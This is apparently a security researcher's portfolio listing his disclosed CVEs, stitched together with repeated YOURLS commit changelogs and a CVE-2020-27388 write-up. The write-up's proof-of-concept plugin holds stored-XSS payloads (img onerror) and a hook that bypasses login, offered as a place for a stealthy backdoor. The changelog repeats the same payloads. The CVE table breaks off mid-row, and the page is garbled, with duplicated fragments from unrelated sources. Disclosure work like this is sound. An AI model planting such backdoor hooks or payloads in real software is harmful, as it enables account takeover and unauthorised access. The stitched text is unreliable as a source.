# Hack the Galaxy.

Welcome to my portfolio. My name is [John Jackson](https://en.wikipedia.org/wiki/John_Jackson_%28hacker%29), also known to many as "Mr. Hacking".
I am the founder of now defunct hacking group [Sakura Samurai](https://en.wikipedia.org/wiki/Sakura_Samurai_%28group%29).

I may not research with a group, however, I'm still continously honing my skills and performing security research. This portfolio will be for organizing all of my work/accomplishments. Keep in mind that I cannot possibly link all of the news articles related to my research, otherwise this portfolio will be too long. In addition, I may link to blog posts from my old website - but my website is outdated and only running for the sake of archive and backlinks; Github will be my primary operating portfolio now.

 I'm also the author of Corporate Cybersecurity: Identifying Risks and The Bug Bounty Program. Click on the image to see my book!

### My Identified Common Vulnerabilities & Exposures (CVES)

| **Name** | **Severity** | **Description** | **Associated Risk** | **Additional Comments** | **Proof of Concept** |
| --- | --- | --- | --- | --- | --- |
| [**CVE-2024-38143: Windows WLAN AutoConfig Service Elevation of Privilege Vulnerability**](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38143) | 4.2 MEDIUM | An unauthenticated attacker could exploit the vulnerability by interacting with a malicious wireless network from the lock screen of a device. | Successful exploitation results in possible escalation to NT AUTHORITY\SYSTEM | Primary attack method requires physical access to the device. As a secondary option, an attacker could pair this with social engineering, but it would still require an in-person presence. Attack vector would be a threat actor who steals a laptop, but is locked out of the computer and wants to access the data/doesn't want to completely reformat or swap drives. | N/A |
| [**CVE-2023-47800: Natus NeuroWorks and SleepWorks Use of Hard-coded Credentials**](https://nvd.nist.gov/vuln/detail/CVE-2023-47800) | 9.8 CRITICAL | Natus NeuroWorks and SleepWorks before 8.4 GMA3 utilize a default password of xltek for the Microsoft SQL Server service sa account, allowing a threat actor to perform remote code execution, data exfiltration, or other nefarious actions such as tampering with data or destroying/disrupting MSSQL services. | Remote code execution via MSSQL paired with CrackMapExec. Data theft, tampering, or destruction. Negatively affecting medical patients' results. | More likely to be exploited by a threat actor on the internal network, have used this on multiple medical client networks so it's relevant for pivoting. | [**Writeup**](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/pwning-electroencephalogram-eeg-medical-devices-by-default/) |
| [**CVE-2023-24068: Signal Desktop Attachment Modification**](https://nvd.nist.gov/vuln/detail/CVE-2023-24068) | 7.8 HIGH | Signal Desktop before 6.2.0 on Windows, Linux, and macOS allows an attacker to modify conversation attachments within the attachments.noindex directory. Client mechanisms fail to validate modifications of existing cached files, resulting in an attacker's ability to insert malicious code into pre-existing attachments or replace them completely. A threat actor can forward the existing attachment in the corresponding conversation to external groups, and the name and size of the file will not change, allowing the malware to masquerade as another file. | Native spear fishing. If a backdoored attachment gets forwarded to a group chat, everyone can end up compromised. | Unlikely to be abused by your everday threat actor. This is of particular interest to federal and intelligence agencies, both domestic to the US and foreign. | [**Writeup**](https://johnjhacking.com/blog/cve-2023-24068-cve-2023-24069/) |
| [**CVE-2023-24069: Signal Desktop Attachment Recovery After Deletion**](https://nvd.nist.gov/vuln/detail/CVE-2023-24069) | 3.3 LOW | Signal Desktop before 6.2.0 on Windows, Linux, and macOS allows an attacker to obtain potentially sensitive attachments sent in messages from the attachments.noindex directory. Cached attachments are not effectively cleared. In some cases, even after a self-initiated file deletion, an attacker can still recover the file if it was previously replied to in a conversation./p> | Recovery of deleted attachments, rendering deletion pointless. | Unlikely to be abused by your everday threat actor. This is of particular interest to federal agencies or within eDiscovery and legal hold processes. | [**Writeup**](https://johnjhacking.com/blog/cve-2023-24068-cve-2023-24069/) |
| [**CVE-2022-27226: CSRF to RCE in iRZ Mobile Routers through 2022-03-16**](https://nvd.nist.gov/vuln/detail/cve-2022-27226) | 8.8 HIGH | A CSRF issue in /api/crontab on iRZ Mobile Routers through 2022-03-16 allows a threat actor to create a crontab entry in the router administration panel. The cronjob will consequently execute the entry on the threat actor's defined interval, leading to remote code execution, allowing the threat actor to gain filesystem access. In addition, if the router's default credentials aren't rotated or a threat actor discovers valid credentials, remote code execution can be achieved without user interaction. | Remote code execution via compromised credentials or chained credential theft. | Likely to be abused if access to this router is obtained. Exploitation is trivial. | [**Writeup**](https://johnjhacking.com/blog/cve-2022-27226/) |

This payload will execute globally on the client side. | Credential theft via phishing | Possible account theft. | [**Writeup**](https://github.com/SakuraSamuraii/CVE-2021-43032) |
| [**CVE-2021-23827: Keybase Exposure of Sensitive Information to an Unauthorized Actor**](https://nvd.nist.gov/vuln/detail/CVE-2021-23827) | 5.5 MEDIUM | Keybase Desktop Client before 5.6.0 on Windows and macOS, and before 5.6.1 on Linux, allows an attacker to obtain potentially sensitive media (such as private pictures) in the Cache and uploadtemps directories. It fails to effectively clear cached pictures, even after deletion via normal methodology within the client, or by utilizing the "Explode message/Explode now" functionality. Local filesystem access is needed by the attacker. | Recovery of deleted attachments, rendering deletion pointless. | Unlikely to be abused by your everday threat actor. This is of particular interest to federal agencies or within eDiscovery and legal hold processes. | [**Writeup**](https://johnjhacking.com/blog/cve-2021-23827/) |

A threat actor can access the /files.md5 file on the client side of a Gurock TestRail application, disclosing a full list of application files and the corresponding file paths. | The corresponding file paths can be tested, and in some cases, result in the disclosure of hardcoded credentials, API keys, or other sensitive data. | Possible discovery during web application hacking. | [**Writeup**](https://johnjhacking.com/blog/cve-2021-40875/) |
| [**CVE-2021-24495: Wordpress Marmoset Viewer Plugin Reflected XSS**](https://nvd.nist.gov/vuln/detail/CVE-2021-24495) | 6.1 MEDIUM | A reflected cross site scripting vulnerability exists on the ‘id’ parameter of the Wordpress Marmoset Viewer plugin. A threat actor can utilize a specially crafted payload and append it to the id parameter included in the Marmoset Viewer. The cross site scripting vulnerability can lead to the potential theft of cookies or credentials, giving the threat actor the ability to take over a victim’s account or steal other sensitive information. | Credential theft via phishing | This may be chained with a post-authenticated exploit, unlikely to be used otherwise. | [**Writeup**](https://johnjhacking.com/blog/cve-2021-24495-improper-neutralization-of-input-during-web-page-generation-on-id-parameter-in-wordpress-marmoset-viewer-plugin-versions-1.9.3-leads-to-reflected-cross-site-scripting/) |

Co-authored-by: dgw <dgw@technobabbl.es>

* Fix that effing encoding problem (#2690)

This commit's changelog

- less encode/decode
- update jQuery & remove old ones
- No encoding in JS
- Also, 4 spaces in JS too, duh
- IDN domain functions
- Use mb_ functions to preverse IDN domains
- Support for UTF8MB4
- update install procedure
- update upgrade procedure. Note: The log table will be left untouched by the upgrade, it's impossible to make a convenient upgrade script for thousands of rows. The only problem will be if someone uses UTF8 short URLs (eg `http://sho.rt/éé💩`)
- Handle normalization of IDN domains & tests
- Fix warning on 7.2 and 7.3
- Deal with encoding in bookmarklets
- Enclose upgrade queries in a transaction
- Force no caching upon install or upgrade. Note: Strange behavior: if YOURLS hosted on an IDN domain, browser (FF at least) caches the redirection from admin/index.php to admin/install.php
- Support for IDN YOURLS hosting
- Tests for IDN YOURLS hosting
- Fix code (that will never get run again)
- Don't cache ajax requests
- Remove unnecessary function call
- Add comment doc block
- More IDN sanitizing tests
- IDN : Screw the \"open dots\". Who's going to type domain。com instead of domain.com anyway? Seriously. (although these do pass on my dev box)
- Deprecate yourls_lowercase_scheme_domain()
- Update doc to reflect DB change

* On logout, explicitely send to index.php

Fix logout link in admin panel.

* Sanitize plugin file header before display (#2761)

Avoid improbable case such as:

/**
 * Plugin Name: anything\"><img src=x onerror=prompt(\"name\")>
 * Plugin URI: anything\"><img src=x onerror=prompt(\"\")>
 * Description: anything\"><img src=x onerror=prompt(\"desc\")>
 * Version: anything\"><img src=x onerror=prompt('version')>
 * Author: anything\"><img src=x onerror=prompt('author')>
 * Author URI: anything\"><img src=x onerror=prompt(\"desc\")>
 */

* Remove `global $ydb` calls and prefer helper function (#2762)

- Add tests
- Introduce yourls_set_db()

* Replace `call_user_func()` with variable functions (#2763)

Fixes #2714

* Update clipboard.js to 2.0.6 (#2788)

Internal breaking change : js constructor from `new Clipboard()` to `new ClipboardJS()`

Signed-off-by: Aaron <admin@datahoarder.dev>

* optional `$title` param in `yourls_table_add_row()` can't be optional (#2808)

PHP 8.0 deprecated optional parameters before required ones:
https://php.watch/versions/8.0/deprecate-required-param-after-optional

All call sites in YOURLS already pass `$title` (because they have to),
so there's no reason it needs to be an optional argument. This change
resolves part of #2807.

Additionally, the first line of `yourls_table_add_row()` was indented
with spaces instead of using s tab character like the rest of the file.
This has been corrected as a bonus.

* Update tests matrix and setup

* Update travis for composer 2

* Fix that effing encoding problem (#2690)

This commit's changelog

- less encode/decode
- update jQuery & remove old ones
- No encoding in JS
- Also, 4 spaces in JS too, duh
- IDN domain functions
- Use mb_ functions to preverse IDN domains
- Support for UTF8MB4
- update install procedure
- update upgrade procedure. Note: The log table will be left untouched by the upgrade, it's impossible to make a convenient upgrade script for thousands of rows. The only problem will be if someone uses UTF8 short URLs (eg `http://sho.rt/éé💩`)
- Handle normalization of IDN domains & tests
- Fix warning on 7.2 and 7.3
- Deal with encoding in bookmarklets
- Enclose upgrade queries in a transaction
- Force no caching upon install or upgrade. Note: Strange behavior: if YOURLS hosted on an IDN domain, browser (FF at least) caches the redirection from admin/index.php to admin/install.php
- Support for IDN YOURLS hosting
- Tests for IDN YOURLS hosting
- Fix code (that will never get run again)
- Don't cache ajax requests
- Remove unnecessary function call
- Add comment doc block
- More IDN sanitizing tests
- IDN : Screw the \"open dots\". Who's going to type domain。com instead of domain.com anyway? Seriously. (although these do pass on my dev box)
- Deprecate yourls_lowercase_scheme_domain()
- Update doc to reflect DB change

* On logout, explicitely send to index.php

Fix logout link in admin panel.

* optional `$title` param in `yourls_table_add_row()` can't be optional (#2808)

PHP 8.0 deprecated optional parameters before required ones:
https://php.watch/versions/8.0/deprecate-required-param-after-optional

All call sites in YOURLS already pass `$title` (because they have to),
so there's no reason it needs to be an optional argument. This change
resolves part of #2807.

Additionally, the first line of `yourls_table_add_row()` was indented
with spaces instead of using s tab character like the rest of the file.
This has been corrected as a bonus.

Best-effort attempt to declare all extensions used by YOURLS.

Based on the output of https://github.com/RogerGee/php-ext-depends

`composer check-platform-reqs` will show the status of all except those
in \"suggest\", which is a limitation to sort out later.

* Update composer.json extension requirements after further research

* Fix that effing encoding problem ([YOURLS#2690](https://github.com/YOURLS/YOURLS/pull/2690))

This commit's changelog

- less encode/decode
- update jQuery & remove old ones
- No encoding in JS
- Also, 4 spaces in JS too, duh
- IDN domain functions
- Use mb_ functions to preverse IDN domains
- Support for UTF8MB4
- update install procedure
- update upgrade procedure. Note: The log table will be left untouched by the upgrade, it's impossible to make a convenient upgrade script for thousands of rows. The only problem will be if someone uses UTF8 short URLs (eg `[http://sho.rt/éé💩`](http://sho.rt/%C3%A9%C3%A9%F0%9F%92%A9%60))
- Handle normalization of IDN domains & tests
- Fix warning on 7.2 and 7.3
- Deal with encoding in bookmarklets
- Enclose upgrade queries in a transaction
- Force no caching upon install or upgrade. Note: Strange behavior: if YOURLS hosted on an IDN domain, browser (FF at least) caches the redirection from admin/index.php to admin/install.php
- Support for IDN YOURLS hosting
- Tests for IDN YOURLS hosting
- Fix code (that will never get run again)
- Don't cache ajax requests
- Remove unnecessary function call
- Add comment doc block
- More IDN sanitizing tests
- IDN : Screw the "open dots". Who's going to type domain。com instead of domain.com anyway? Seriously. (although these do pass on my dev box)
- Deprecate yourls_lowercase_scheme_domain()
- Update doc to reflect DB change

* On logout, explicitely send to index.php

Fix logout link in admin panel.

* Sanitize plugin file header before display ([YOURLS#2761](https://github.com/YOURLS/YOURLS/pull/2761))

Avoid improbable case such as:

 * Plugin URI: anything"><img src=x onerror=prompt("")>
 * Description: anything"><img src=x onerror=prompt("desc")>

 * Author URI: anything"><img src=x onerror=prompt("desc")>
 */

* Remove `global $ydb` calls and prefer helper function ([YOURLS#2762](https://github.com/YOURLS/YOURLS/pull/2762))

Fixes [YOURLS#2698](https://github.com/YOURLS/YOURLS/issues/2698)

Changes :
- Replace all global $ydb; and $ydb->... with yourls_get_db()-> in code and tests
- Add tests
- Introduce yourls_set_db()

* Replace `call_user_func()` with variable functions ([YOURLS#2763](https://github.com/YOURLS/YOURLS/pull/2763))

Fixes [YOURLS#2714](https://github.com/YOURLS/YOURLS/issues/2714)

* Display default shorturls_length in the database if not already set ([YOURLS#2767](https://github.com/YOURLS/YOURLS/pull/2767))

* Fix typo broken in [YOURLS#2781](https://github.com/YOURLS/YOURLS/pull/2781) ([YOURLS#2786](https://github.com/YOURLS/YOURLS/pull/2786))

* Update clipboard.js to 2.0.6 ([YOURLS#2788](https://github.com/YOURLS/YOURLS/pull/2788))

Internal breaking change : js constructor from `new Clipboard()` to `new ClipboardJS()`

* optional `$title` param in `yourls_table_add_row()` can't be optional ([YOURLS#2808](https://github.com/YOURLS/YOURLS/pull/2808))

PHP 8.0 deprecated optional parameters before required ones:
<https://php.watch/versions/8.0/deprecate-required-param-after-optional>

All call sites in YOURLS already pass `$title` (because they have to),
so there's no reason it needs to be an optional argument. This change
resolves part of [YOURLS#2807](https://github.com/YOURLS/YOURLS/issues/2807).

Additionally, the first line of `yourls_table_add_row()` was indented
with spaces instead of using s tab character like the rest of the file.
This has been corrected as a bonus.

# CVE-2020-27388: YOURLS 1.5 - 1.7.10, Multiple Stored Cross Site Scripting (XSS) Vulnerabilities in Admin Panel

Multiple Stored Cross Site Scripting (XSS) vulnerabilities exist in the YOURLS Admin Panel, Versions 1.5 - 1.7.10. An authenticated user must modify a PHP Plugin with a malicious payload and upload it, resulting in multiple stored XSS issues.

Published on Oct 23, 2020

Reading time: 2 minutes.

---

# **Potential Abuse on a hooked Function**

There is a potential for abuse with any plugins that implement the hook function ‘shunt\_is\_valid\_user’. In the code below we simply demonstrate that authentication can be completely bypassed by returning TRUE in the hooked function. This would be an ideal place for a stealthy backdoor or any other malicious code. It should be noted that this itself is not a vulnerability, but has a potential to be misused and plugins that use this hook should be checked.

Also note that the plugin will have to be activated in order to run the malicious hook. You can use the plugin below and activate it, and you will notice that you no longer need to log in.

# **Affected Version(s)**

YOURLS 1.5 - 1.7.10

# **Steps to Replicate**

1.Follow the instructions on[https://yourls.org/#Install](https://yourls.org/#Install "https://yourls.org/#Install") for setting up YOURLS in a local environment for testing or test in your existing instance.

2. Install version ‘1.7.9’ from[https://github.com/YOURLS/YOURLS/releases](https://yourls.org/#Install "https://yourls.org/#Install"). [*We noticed that when the application is set up, it uses version 1.7.10 even though the latest version is 1.7.9.*]

3. Create a new directory in YOURLS/user/plugins directory named ‘exploit’

4. In that directory, create ‘plugin.php’ and paste the following code and save the file:

```
<?php

/*

Plugin Name: anything"><img src=x onerror=prompt(‘name’)>

Plugin URI: plugin URI

Description: anything"><img src=x onerror=prompt('desc')>

Version: anything"><img src=x onerror=prompt('version')>

Author: anything"><img src=x onerror=prompt('author')>

Author URI: author URI

\*/

// No direct call

if( !defined( 'YOURLS_ABSPATH' ) ) die();

// This is code demonstrating how a malicious plugin can hook and bypass authentication

yourls_add_filter( 'shunt_is_valid_user' , 'exploit' );

function exploit(){

return TRUE;

}

```

5. Login to the /admin path and go to “Manage Plugins”.

6. Upon loading the page, you will observe 4 separate instances of Stored XSS.

### GimmeHead3rz Tool Release

During Web Application & API Penetration Testing engagements there is always a need to evaluate headers and cookies of given endpoints in order to ensure security requirements are being met. Currently, many of the existing open-source tools for header analysis seem to be outdated, missing newer headers, inconsistent with results, and thus lacking proper detections. With this as the inspiration, our team set out to create an open-source solution to make analyzing headers easier for both Offensive and Defensive security teams.
